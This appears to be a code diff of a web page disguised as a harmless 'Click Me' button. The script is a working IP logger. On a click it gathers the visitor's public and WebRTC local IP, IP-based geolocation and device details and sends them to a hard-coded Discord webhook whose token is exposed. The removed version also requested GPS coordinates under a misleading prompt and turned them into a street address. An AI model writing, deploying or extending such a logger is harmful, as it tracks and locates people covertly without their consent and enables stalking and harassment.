@@ -8,7 +8,6 @@
         button:hover { background-color: #4752C4; }
         button:disabled { opacity: 0.5; cursor: not-allowed; }
         #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
-        #permissionMessage { margin-top: 20px; color: #ff9800; display: none; }
     </style>
 </head>
 <body>
@@ -16,53 +15,171 @@
     <p>click the button below:</p>
     
     <button id="trackButton">Click Me</button>
-    <div id="permissionMessage">allow shit for technologic purposes</div>
     <div id="status"></div>
     
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
-        function detectDevice() {
-            const ua = navigator.userAgent.toLowerCase();
-            let deviceType = 'Desktop';
+        async function getIPAddress() {
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://api.my-ip.io/ip.json',
+                'https://ip.seeip.org/jsonip',
+                'https://api.ip.sb/ip'
+            ];
+            
+            for (const service of services) {
+                try {
+                    const res = await fetch(service, { timeout: 3000 });
+                    const data = await res.json();
+                    if (data.ip) return data.ip;
+                } catch (e) {
+                    continue;
+                }
+            }
+            return 'Unknown';
+        }
+        
+        async function getGlobalLocation(ip) {
+            const apis = [
+                {
+                    name: 'ipapi.co',
+                    url: `https://ipapi.co/${ip}/json/`,
+                    parse: (data) => ({
+                        lat: data.latitude,
+                        lon: data.longitude,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        isp: data.org,
+                        zip: data.postal,
+                        timezone: data.timezone,
+                        currency: data.currency,
+                        calling_code: data.country_calling_code
+                    })
+                },
+                {
+                    name: 'ip-api.com',
+                    url: `http://ip-api.com/json/${ip}`,
+                    parse: (data) => ({
+                        lat: data.lat,
+                        lon: data.lon,
+                        city: data.city,
+                        region: data.regionName,
+                        country: data.country,
+                        isp: data.isp,
+                        zip: data.zip,
+                        timezone: data.timezone,
+                        currency: data.currency,
+                        calling_code: data.countryCode ? `+${data.countryCode}` : null
+                    })
+                },
+                {
+                    name: 'freegeoip.app',
+                    url: `https://freegeoip.app/json/${ip}`,
+                    parse: (data) => ({
+                        lat: data.latitude,
+                        lon: data.longitude,
+                        city: data.city,
+                        region: data.region_name,
+                        country: data.country_name,
+                        isp: data.isp,
+                        zip: data.zip_code,
+                        timezone: data.time_zone,
+                        currency: data.currency ? data.currency.code : null,
+                        calling_code: data.country_code
+                    })
+                }
+            ];
+            
+            for (const api of apis) {
+                try {
+                    const res = await fetch(api.url);
+                    const data = await res.json();
+                    if (data && (data.latitude || data.lat)) {
+                        const location = api.parse(data);
+                        return {
+                            ...location,
+                            source: api.name,
+                            success: true
+                        };
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            return {
+                lat: 'Unknown',
+                lon: 'Unknown',
+                city: 'Unknown',
+                region: 'Unknown',
+                country: 'Unknown',
+                isp: 'Unknown',
+                zip: 'Unknown',
+                timezone: 'Unknown',
+                currency: 'Unknown',
+                calling_code: 'Unknown',
+                source: 'Failed',
+                success: false
+            };
+        }
+        
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            const languages = navigator.languages;
+            const platform = navigator.platform;
+            const vendor = navigator.vendor;
+            const language = navigator.language;
+            const cookies = navigator.cookieEnabled;
+            const doNotTrack = navigator.doNotTrack;
+            const online = navigator.onLine;
+            const pdf = navigator.pdfViewerEnabled;
+            const hardwareCores = navigator.hardwareConcurrency;
+            const deviceMemory = navigator.deviceMemory;
+            const maxTouch = navigator.maxTouchPoints;
+            
+            let device = 'Desktop';
+            if (/mobile/i.test(ua)) device = 'Mobile';
+            if (/tablet/i.test(ua)) device = 'Tablet';
+            
             let os = 'Unknown';
+            if (/windows/i.test(ua)) os = 'Windows';
+            else if (/mac/i.test(ua)) os = 'macOS';
+            else if (/linux/i.test(ua)) os = 'Linux';
+            else if (/android/i.test(ua)) os = 'Android';
+            else if (/ios|iphone|ipad/i.test(ua)) os = 'iOS';
+            
             let browser = 'Unknown';
+            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
+            else if (/firefox/i.test(ua)) browser = 'Firefox';
+            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
+            else if (/edge/i.test(ua)) browser = 'Edge';
+            else if (/opera/i.test(ua)) browser = 'Opera';
             
-            if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini|windows phone/i.test(ua)) {
-                deviceType = 'Mobile';
-            }
-            if (/tablet|ipad|android(?!.*mobile)|kindle|silk/i.test(ua)) {
-                deviceType = 'Tablet';
-            }
-            
-            if (/windows/.test(ua)) {
-                if (/windows nt 5/.test(ua)) os = 'Windows XP';
-                else if (/windows nt 6.0/.test(ua)) os = 'Windows Vista';
-                else if (/windows nt 6.1/.test(ua)) os = 'Windows 7';
-                else if (/windows nt 6.2/.test(ua)) os = 'Windows 8';
-                else if (/windows nt 6.3/.test(ua)) os = 'Windows 8.1';
-                else if (/windows nt 10/.test(ua)) os = 'Windows 10';
-                else if (/windows nt 11/.test(ua)) os = 'Windows 11';
-                else os = 'Windows';
-            } else if (/mac os x/.test(ua)) os = 'macOS';
-            else if (/linux/.test(ua)) os = 'Linux';
-            else if (/android/.test(ua)) os = 'Android';
-            else if (/iphone|ipad|ipod/.test(ua)) os = 'iOS';
-            else if (/cros/.test(ua)) os = 'Chrome OS';
-            
-            if (/edg/.test(ua)) browser = 'Microsoft Edge';
-            else if (/chrome/.test(ua)) browser = 'Google Chrome';
-            else if (/firefox/.test(ua)) browser = 'Mozilla Firefox';
-            else if (/safari/.test(ua) && !/chrome/.test(ua)) browser = 'Safari';
-            else if (/opera|opr/.test(ua)) browser = 'Opera';
-            
-            return { deviceType, os, browser, userAgent: navigator.userAgent };
+            return {
+                device,
+                os,
+                browser,
+                ua,
+                languages: languages.join(', '),
+                platform,
+                vendor,
+                language,
+                cookies: cookies ? 'Enabled' : 'Disabled',
+                doNotTrack: doNotTrack || 'Not set',
+                online: online ? 'Online' : 'Offline',
+                pdf: pdf ? 'Yes' : 'No',
+                hardwareCores: hardwareCores || 'Unknown',
+                deviceMemory: deviceMemory ? deviceMemory + ' GB' : 'Unknown',
+                maxTouch
+            };
         }
         
         async function getLocalIP() {
             return new Promise((resolve) => {
-                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                if (!RTCPeerConnection) {
+                if (!window.RTCPeerConnection) {
                     resolve('WebRTC not supported');
                     return;
                 }
@@ -71,7 +188,7 @@
                 const ips = [];
                 
                 pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(err => {});
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                 
                 pc.onicecandidate = (event) => {
                     if (!event.candidate) {
@@ -105,217 +222,15 @@
             });
         }
         
-        async function getIPLocationFromMultipleAPIs(ip) {
-            const apiPromises = [
-                // API 1: ip-api.com (generally good for Indonesia)
-                fetch(`http://ip-api.com/json/${ip}`)
-                    .then(res => res.json())
-                    .then(data => ({
-                        success: data.status === 'success',
-                        city: data.city || '',
-                        region: data.regionName || '',
-                        country: data.country || '',
-                        isp: data.isp || '',
-                        lat: data.lat ? parseFloat(data.lat).toFixed(6) : '',
-                        lon: data.lon ? parseFloat(data.lon).toFixed(6) : '',
-                        source: 'ip-api.com',
-                        query: data.query
-                    }))
-                    .catch(() => null),
-                
-                // API 2: ipapi.co
-                fetch(`https://ipapi.co/${ip}/json/`)
-                    .then(res => res.json())
-                    .then(data => ({
-                        success: !data.error,
-                        city: data.city || '',
-                        region: data.region || '',
-                        country: data.country_name || '',
-                        isp: data.org || '',
-                        lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : '',
-                        lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : '',
-                        source: 'ipapi.co',
-                        query: data.ip
-                    }))
-                    .catch(() => null),
-                
-                // API 3: ipgeolocation.io (free tier)
-                fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=test&ip=${ip}`)
-                    .then(res => res.json())
-                    .then(data => ({
-                        success: data.ip ? true : false,
-                        city: data.city || '',
-                        region: data.state_prov || '',
-                        country: data.country_name || '',
-                        isp: data.isp || '',
-                        lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : '',
-                        lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : '',
-                        source: 'ipgeolocation.io',
-                        query: data.ip
-                    }))
-                    .catch(() => null)
-            ];
+        function formatTime(date) {
+            const day = date.getDate().toString().padStart(2, '0');
+            const month = (date.getMonth() + 1).toString().padStart(2, '0');
+            const year = date.getFullYear();
+            const hours = date.getHours().toString().padStart(2, '0');
+            const minutes = date.getMinutes().toString().padStart(2, '0');
+            const seconds = date.getSeconds().toString().padStart(2, '0');
             
-            const results = await Promise.all(apiPromises);
-            const validResults = results.filter(r => r && r.success);
-            
-            if (validResults.length === 0) {
-                return {
-                    city: 'Unknown',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    isp: 'Unknown',
-                    lat: 'Unknown',
-                    lon: 'Unknown',
-                    source: 'All APIs failed',
-                    accuracy: 'Low - Database outdated'
-                };
-            }
-            
-            // Check if all APIs agree on city
-            const cities = validResults.map(r => r.city.toLowerCase().trim());
-            const uniqueCities = [...new Set(cities.filter(c => c))];
-            
-            let city = validResults[0].city;
-            let region = validResults[0].region;
-            let country = validResults[0].country;
-            let isp = validResults[0].isp;
-            let lat = validResults[0].lat;
-            let lon = validResults[0].lon;
-            let source = validResults[0].source;
-            
-            // If APIs disagree, we have low accuracy
-            if (uniqueCities.length > 1) {
-                return {
-                    city: `${validResults[0].city} (may be wrong)`,
-                    region: region,
-                    country: country,
-                    isp: isp,
-                    lat: lat,
-                    lon: lon,
-                    source: `${source} - conflicting data`,
-                    accuracy: 'Low - APIs disagree',
-                    allResults: validResults
-                };
-            }
-            
-            // Calculate average coordinates if multiple APIs succeeded
-            if (validResults.length > 1 && validResults.every(r => r.lat && r.lon)) {
-                const avgLat = validResults.reduce((sum, r) => sum + parseFloat(r.lat), 0) / validResults.length;
-                const avgLon = validResults.reduce((sum, r) => sum + parseFloat(r.lon), 0) / validResults.length;
-                lat = avgLat.toFixed(6);
-                lon = avgLon.toFixed(6);
-                source = 'Average of ' + validResults.map(r => r.source).join(', ');
-            }
-            
-            return {
-                city: city,
-                region: region,
-                country: country,
-                isp: isp,
-                lat: lat,
-                lon: lon,
-                source: source,
-                accuracy: uniqueCities.length === 1 ? 'Medium' : 'Low',
-                allResults: validResults
-            };
-        }
-        
-        async function getRealTimeLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({
-                        lat: 'Unknown',
-                        lon: 'Unknown',
-                        accuracy: 'N/A',
-                        source: 'Geolocation not supported',
-                        timestamp: new Date().toISOString()
-                    });
-                    return;
-                }
-                
-                const permissionMessage = document.getElementById('permissionMessage');
-                permissionMessage.style.display = 'block';
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        permissionMessage.style.display = 'none';
-                        resolve({
-                            lat: position.coords.latitude.toFixed(8),
-                            lon: position.coords.longitude.toFixed(8),
-                            accuracy: Math.round(position.coords.accuracy) + ' meters',
-                            altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + 'm' : 'N/A',
-                            speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
-                            heading: position.coords.heading ? position.coords.heading + '°' : 'N/A',
-                            source: 'Real-time GPS',
-                            timestamp: new Date(position.timestamp).toISOString()
-                        });
-                    },
-                    (error) => {
-                        permissionMessage.style.display = 'none';
-                        let errorMsg = 'Permission denied';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMsg = 'Permission denied';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMsg = 'Position unavailable';
-                                break;
-                            case error.TIMEOUT:
-                                errorMsg = 'Request timeout';
-                                break;
-                        }
-                        resolve({
-                            lat: 'Unknown',
-                            lon: 'Unknown',
-                            accuracy: 'N/A',
-                            source: errorMsg,
-                            timestamp: new Date().toISOString()
-                        });
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 20000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-        
-        async function getAddressFromCoordinates(lat, lon) {
-            if (lat === 'Unknown' || lon === 'Unknown') {
-                return { address: 'No coordinates' };
-            }
-            
-            try {
-                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-                const data = await res.json();
-                if (data.address) {
-                    return {
-                        address: `${data.address.road || ''} ${data.address.house_number || ''}, ${data.address.city || data.address.town || data.address.village || ''}, ${data.address.country || ''}`.trim(),
-                        full: data.display_name || 'Unknown address'
-                    };
-                }
-            } catch (e) {
-                console.log('Address lookup failed');
-            }
-            
-            return { address: 'Address lookup failed' };
-        }
-        
-        function calculateDistance(lat1, lon1, lat2, lon2) {
-            if (lat1 === 'Unknown' || lon1 === 'Unknown' || lat2 === 'Unknown' || lon2 === 'Unknown') {
-                return 'N/A';
-            }
-            
-            const R = 6371; // Earth's radius in km
-            const dLat = (lat2 - lat1) * Math.PI / 180;
-            const dLon = (lon2 - lon1) * Math.PI / 180;
-            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
-                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
-                      Math.sin(dLon/2) * Math.sin(dLon/2);
-            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-            return (R * c).toFixed(2) + ' km';
+            return `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
         }
         
         document.getElementById('trackButton').addEventListener('click', async function() {
@@ -323,108 +238,65 @@
             const status = document.getElementById('status');
             
             button.disabled = true;
-            button.textContent = 'Preparing suprises..';
+            button.textContent = 'Processing...';
             status.style.display = 'none';
             
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const publicIP = ipData.ip;
-                
+                const publicIP = await getIPAddress();
                 const localIP = await getLocalIP();
-                
-                const ipLocation = await getIPLocationFromMultipleAPIs(publicIP);
-                
-                const realTimeLocation = await getRealTimeLocation();
-                
-                const deviceInfo = detectDevice();
-                
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const language = navigator.language || 'Unknown';
-                
-                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-                const referrer = document.referrer || 'Direct visit';
-                
-                let addressFromGPS = { address: 'No GPS coordinates' };
-                let distanceIPtoGPS = 'N/A';
-                
-                if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
-                    addressFromGPS = await getAddressFromCoordinates(realTimeLocation.lat, realTimeLocation.lon);
-                    
-                    if (ipLocation.lat !== 'Unknown' && ipLocation.lon !== 'Unknown') {
-                        distanceIPtoGPS = calculateDistance(
-                            parseFloat(ipLocation.lat),
-                            parseFloat(ipLocation.lon),
-                            parseFloat(realTimeLocation.lat),
-                            parseFloat(realTimeLocation.lon)
-                        );
-                    }
-                }
-                
-                let ipMapsLink = 'No coordinates';
-                let gpsMapsLink = 'No GPS coordinates';
-                
-                if (ipLocation.lat !== 'Unknown' && ipLocation.lon !== 'Unknown') {
-                    ipMapsLink = `https://maps.google.com/?q=${ipLocation.lat},${ipLocation.lon}`;
-                }
-                
-                if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
-                    gpsMapsLink = `https://maps.google.com/?q=${realTimeLocation.lat},${realTimeLocation.lon}`;
-                }
-                
+                const location = await getGlobalLocation(publicIP);
+                const browserInfo = getBrowserInfo();
                 const now = new Date();
-                const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
-                let hours = now.getHours();
-                const ampm = hours >= 12 ? 'PM' : 'AM';
-                hours = hours % 12;
-                hours = hours ? hours : 12;
-                const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
+                
+                let mapsLink = 'No coordinates';
+                if (location.lat !== 'Unknown' && location.lon !== 'Unknown') {
+                    mapsLink = `https://www.google.com/maps/@${location.lat},${location.lon},15z`;
+                }
                 
                 const embed = {
-                    title: "LOCATION REPORT - BEKASI DETECTED",
-                    color: 16711680,
+                    title: "IP LOGGED FROM " + location.country.toUpperCase(),
+                    color: 0xFF0000,
                     fields: [
                         {
-                            name: "NETWORK & ISP",
-                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${ipLocation.isp}\nIP Location Accuracy: ${ipLocation.accuracy}`,
+                            name: "NETWORK INFORMATION",
+                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${location.isp}`,
                             inline: true
                         },
                         {
-                            name: "IP GEOLOCATION (Database)",
-                            value: `City: ${ipLocation.city}\nRegion: ${ipLocation.region}\nCountry: ${ipLocation.country}\nCoordinates: ${ipLocation.lat}, ${ipLocation.lon}\nSource: ${ipLocation.source}\nMaps: ${ipMapsLink}`,
+                            name: "GEOGRAPHICAL LOCATION",
+                            value: `Country: ${location.country}\nRegion: ${location.region}\nCity: ${location.city}\nZIP: ${location.zip}\nTimezone: ${location.timezone}\nCurrency: ${location.currency}`,
                             inline: true
                         },
                         {
-                            name: "REAL GPS LOCATION (If Allowed)",
-                            value: `Latitude: ${realTimeLocation.lat}\nLongitude: ${realTimeLocation.lon}\nAccuracy: ${realTimeLocation.accuracy}\nSource: ${realTimeLocation.source}\nGPS Maps: ${gpsMapsLink}`,
+                            name: "COORDINATES",
+                            value: `Latitude: ${location.lat}\nLongitude: ${location.lon}\nAccuracy: IP-based\nSource: ${location.source}\nMaps: ${mapsLink}`,
                             inline: true
                         },
                         {
-                            name: "ACCURACY CHECK",
-                            value: `IP to GPS Distance: ${distanceIPtoGPS}\nGPS Address: ${addressFromGPS.address}\nIP Database Accuracy: ${ipLocation.accuracy}\nNote: IP location often wrong in Indonesia`,
+                            name: "DEVICE & BROWSER",
+                            value: `Device: ${browserInfo.device}\nOS: ${browserInfo.os}\nBrowser: ${browserInfo.browser}\nPlatform: ${browserInfo.platform}\nLanguage: ${browserInfo.language}`,
                             inline: true
                         },
                         {
-                            name: "DEVICE INFO",
-                            value: `Device: ${deviceInfo.deviceType}\nOS: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nScreen: ${screenWidth}x${screenHeight}\nLanguage: ${language}`,
+                            name: "SYSTEM INFORMATION",
+                            value: `CPU Cores: ${browserInfo.hardwareCores}\nRAM: ${browserInfo.deviceMemory}\nTouch Points: ${browserInfo.maxTouch}\nPDF Viewer: ${browserInfo.pdf}\nCookies: ${browserInfo.cookies}`,
                             inline: true
                         },
                         {
                             name: "TIME & SESSION",
-                            value: `Date: ${dateStr}\nTime: ${timeStr}\nCookies: ${cookiesEnabled}\nReferrer: ${referrer.substring(0, 30)}${referrer.length > 30 ? '...' : ''}`,
+                            value: `Local Time: ${formatTime(now)}\nUTC Time: ${now.toUTCString()}\nReferrer: ${document.referrer || 'Direct'}\nURL: ${window.location.href}\nUser Agent: \`\`\`${browserInfo.ua.substring(0, 300)}\`\`\``,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: `User is likely in BEKASI | IP shows ${ipLocation.city} (possibly wrong) | GPS accuracy: ${realTimeLocation.accuracy}`
+                        text: "Global IP Logger • Works in all countries • " + location.source
                     },
-                    timestamp: new Date().toISOString()
+                    timestamp: now.toISOString()
                 };
                 
                 const discordMessage = {
                     embeds: [embed],
-                    username: "Bekasi IP Logger"
+                    username: "Global IP Logger"
                 };
                 
                 const response = await fetch(WEBHOOK_URL, {
@@ -434,20 +306,16 @@
                 });
                 
                 if (response.ok) {
-                    if (realTimeLocation.source === 'Real-time GPS') {
-                        status.textContent = 'Exact GPS location captured!';
-                    } else {
-                        status.textContent = 'IP location captured (may be inaccurate)';
-                    }
+                    status.textContent = 'Logged successfully. Check Discord.';
                     status.style.color = '#4CAF50';
                     status.style.backgroundColor = '#E8F5E9';
                 } else {
-                    throw new Error('Discord error');
+                    throw new Error('Failed to send');
                 }
                 
             } catch (error) {
                 console.error('Error:', error);
-                status.textContent = 'Error occurred. Please try again.';
+                status.textContent = 'Error. Please try again.';
                 status.style.color = '#F44336';
                 status.style.backgroundColor = '#FFEBEE';
             } finally {
